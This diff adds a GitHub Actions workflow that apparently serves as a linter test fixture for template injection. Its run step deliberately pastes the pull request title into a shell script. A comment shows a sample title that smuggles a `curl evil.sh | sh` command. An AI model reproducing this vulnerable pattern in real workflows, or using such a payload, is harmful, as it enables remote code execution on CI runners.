@@ -1,0 +1,17 @@
+# expect: template-injection
+# The PR title is pasted into the shell script before the shell runs, so a title like
+# `x"; curl evil.sh | sh; echo "` is a command. The expression is expanded by Actions, not
+# by bash, so quoting inside the script does not help.
+name: script-injection
+on: pull_request
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  greet:
+    name: greet
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Thanks for ${{ github.event.pull_request.title }}"
